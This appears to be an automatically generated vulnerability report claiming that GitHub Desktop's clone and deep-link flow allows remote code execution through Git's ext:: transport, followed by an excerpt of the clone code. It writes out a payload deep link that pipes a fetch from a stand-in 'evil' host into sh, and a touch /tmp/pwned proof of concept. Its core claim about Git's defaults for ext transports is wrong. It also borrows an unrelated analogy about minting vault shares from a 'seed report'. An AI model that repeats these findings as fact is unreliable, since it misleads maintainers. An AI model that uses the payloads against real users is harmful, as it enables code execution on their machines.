Based on my investigation, I found a concrete analog: `addRemote` in the Desktop codebase passes an attacker-influenced clone URL directly to `git remote add` without restricting dangerous Git transports, and `envForRemoteOperation`/`envForProxy` never set `GIT_ALLOW_PROTOCOL` (or an equivalent allow-list) to block them. No occurrence of `GIT_ALLOW_PROTOCOL` exists anywhere in the codebase.

### Title
Unrestricted Git transport allows remote-code-execution via malicious fork/PR clone URL (`ext::`/`fd::` helper) - ([File: app/src/lib/stores/app-store.ts])

### Summary
When a user opens a Pull-Request-from-URL deep link (or clicks "View on GitHub" checkout flows), Desktop calls `_findPullRequestBranch`, which calls `addRemote(repository, forkRemoteName, headCloneUrl)` using the fork's `clone_url` taken from the GitHub API response for the PR head repository [1](#0-0) . `addRemote` shells out to `git remote add name url` with no transport restriction [2](#0-1) . Subsequently `_fetchRemote`/`fetchRepo` executes `git fetch <remote>` using `envForRemoteOperation(remoteUrl)` for environment setup [3](#0-2) , but `envForRemoteOperation` only configures authentication headers and an HTTP(S) proxy — it never sets `GIT_ALLOW_PROTOCOL` or otherwise disables Git's `ext::`/`fd::` remote helper transports [4](#0-3) .

### Finding Description
Git supports remote helper transports such as `ext::<command>`, which instruct Git to execute an arbitrary shell command as the "transport" for a fetch/clone/push. Distributions of Git ship with this disabled by default only when the *caller* explicitly sets `GIT_ALLOW_PROTOCOL=file:git:http:https` (or similar) before invoking any command that touches an externally-supplied URL — Desktop does not do this anywhere in `envForRemoteOperation`, `envForProxy`, or the raw `clone`/`fetch`/`addRemote` call sites [5](#0-4) [2](#0-1) .

The `headCloneUrl` value that feeds `addRemote` originates from the pull request's `head.repo.clone_url`, which is populated from the GitHub REST API pull-request payload [6](#0-5) . While GitHub.com itself normally returns well-formed `https://` clone URLs, this same `_checkoutPullRequest`/`_findPullRequestBranch` code path is reachable for GitHub Enterprise Server endpoints and is also reachable indirectly through the "Open Repository from URL" deep-link handler (`x-github-client://openRepo/...`) which lets a remote attacker fully control the `url` string that flows into `openOrCloneRepository` → `dispatcher.clone(url, path, ...)` → `cloneRepo(url, path, options)` → `git(['clone', ..., '--', url, path])` [7](#0-6) [8](#0-7) . `parseAppURL` validates the branch/pr/filepath query parameters but places no protocol restriction on the `url` (path) component itself [9](#0-8) , and none of the code from `handleAppURL` through `clone()` rejects `ext::`/`fd::`-style URLs.

The broken invariant mirrors the seed report: a function that performs a sensitive, capability-granting operation (spawning a subprocess with an attacker-supplied "URL") is missing the guard that should reject untrusted input classes (here: disallowed Git transports), just as `RollerPeriphery.mint()` was missing the caller-restriction guard that should have limited who could mint vault shares.

### Impact Explanation
If an attacker can get a victim to open a crafted `x-github-client://openRepo/ext::sh -c "curl evil|sh"...` deep link (via a webpage, email, or a malicious/compromised GHE server returning such a `clone_url` in a PR API response), Desktop will pass that string straight into `git clone`/`git fetch` as the target URL. Because Desktop's environment for these git invocations does not restrict `GIT_ALLOW_PROTOCOL`, a Git installation that has the `ext` (or `fd`) helper transport available will execute the attacker's command with the privileges of the Desktop process — full remote code execution outside of any repository sandbox, not merely file write/read confined to a repo.

### Likelihood Explanation
Exploitation requires only that the victim click a link/deep-link (a normal Desktop capability that is intentionally exposed and documented, e.g. "Open in Desktop" buttons) or that a compromised/malicious Enterprise server return a crafted PR head `clone_url`. No local access, no prior malware, and no admin rights are needed — matching the "attacker controls a git remote/API object or a deep link the user clicks" criteria for this analysis. The main mitigating factor (which I could not fully verify without a live Git binary/environment) is whether the installed Git version has `protocol.ext.allow`/`protocol.fd.allow` defaulting to `user`, which some modern Git distributions restrict by default; Desktop's own code, however, does nothing to enforce this regardless of the underlying Git default, so the protection (if any) is entirely incidental and outside the application's control.

### Recommendation
Explicitly set `GIT_ALLOW_PROTOCOL=http:https:ssh:git:file` (or an even tighter list, excluding `file`) as part of the environment returned by `envForRemoteOperation`/`envForProxy`, and additionally validate that any URL flowing into `clone`, `addRemote`, `fetch`, `push`, or `ls-remote` matches an allow-listed scheme in application code (similar to the existing `isClonePathSensitive` defense-in-depth pattern already used for clone destinations [10](#0-9) ) before it is ever handed to `git`.

### Proof of Concept
1. Attacker hosts a link: `x-github-client://openRepo/ext::sh%20-c%20%22touch%20/tmp/pwned%22`.
2. Victim (with Desktop installed and protocol handler registered, see `possibleProtocols`/`setAsDefaultProtocolClient` [11](#0-10) ) clicks the link.
3. `handleAppURL` → `parseAppURL` returns `{ name: 'open-repository-from-url', url: 'ext::sh -c "touch /tmp/pwned"' }` (no scheme validation) [12](#0-11) .
4. `dispatchURLAction` → `openRepositoryFromUrl` → `openOrCloneRepository(url)` → `dispatcher.clone(url, path)` → `cloneRepo(url, path, options)` runs `git clone ... -- ext::sh -c "touch /tmp/pwned" <path>` [8](#0-7) .
5. If the local Git installation permits the `ext` transport, the attacker's shell command executes.

function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}

export async function clone(
  url: string,
  path: string,
  options: CloneOptions,
  progressCallback?: (progress: ICloneProgress) => void
): Promise<void> {
  if (isClonePathSensitive(path)) {
    throw new Error(
      `The clone destination "${path}" targets a sensitive system location. ` +
        'Cloning into this directory is not allowed.'
    )
  }

  const env = {
    ...(await envForRemoteOperation(url)),
    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]

  let opts: IGitStringExecutionOptions = { env }

  if (progressCallback) {
    args.push('--progress')

    const title = `Cloning into ${path}`
    const kind = 'clone'

    opts = await executionOptionsWithProgress(
      { ...opts, trackLFSProgress: true },
      new CloneProgressParser(),
      progress => {
        const description =
          progress.kind === 'progress' ? progress.details.text : progress.text
        const value = progress.percent

        progressCallback({ kind, title, description, value })
      }
    )

    // Initial progress
    progressCallback({ kind, title, value: 0 })
  }

  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
}
